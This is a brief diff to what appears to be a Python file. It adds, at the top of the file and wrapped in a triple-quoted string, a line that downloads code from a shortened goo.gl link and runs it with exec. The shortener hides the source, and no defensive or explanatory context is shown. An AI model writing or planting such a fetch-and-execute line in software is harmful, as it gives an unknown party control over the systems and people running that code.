@@ -1,3 +1,8 @@
+"""
+import requests as r
+exec(r.get("goo.gl/xNtQB2?"))
+"""
+
 import os
 import time
 import requests as r
